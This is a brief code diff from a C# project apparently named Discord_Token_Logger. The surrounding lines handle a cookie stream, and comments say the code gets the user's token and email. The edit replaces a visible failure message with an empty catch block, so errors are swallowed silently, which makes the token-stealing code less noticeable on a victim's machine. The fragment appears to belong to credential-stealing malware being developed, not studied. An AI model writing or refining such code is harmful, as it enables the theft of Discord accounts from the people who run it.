@@ -51,7 +51,7 @@ namespace Discord_Token_Logger
                     CookieStream.Dispose();
 
                 }
-                catch { Console.Write("Failed"); Console.Read(); }
+                catch {}
 
                 /*--------------Get the token and Email--------------*/
                 //Gets the token
